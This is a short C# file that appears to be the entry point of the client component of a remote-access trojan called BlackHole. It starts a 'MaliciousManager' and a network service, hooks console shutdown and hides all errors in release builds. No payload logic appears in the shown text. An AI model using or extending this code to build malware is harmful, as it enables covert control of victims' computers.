using System;
using System.Threading;
using System.Windows.Forms;
using BlackHole.Slave.Helper.Native.Impl;
using BlackHole.Slave.Malicious;

namespace BlackHole.Slave
{
    public class Program
    {
        public static void Main(string[] args)
        {
            try
            {
                MaliciousManager.Instance.Initialize();
                NetworkService.Instance.Initialize();

                Kernel32.SetConsoleCtrlHandler(ctrl =>
                {
                    NetworkService.Instance.FireShutdown((int)ctrl);
                    Thread.Sleep(500);
                    return true;
                }, true);
                Application.Run();
            }
            catch(Exception e)
            {
#if DEBUG
                MessageBox.Show(e.ToString());
#endif
            }
        }
    }
}
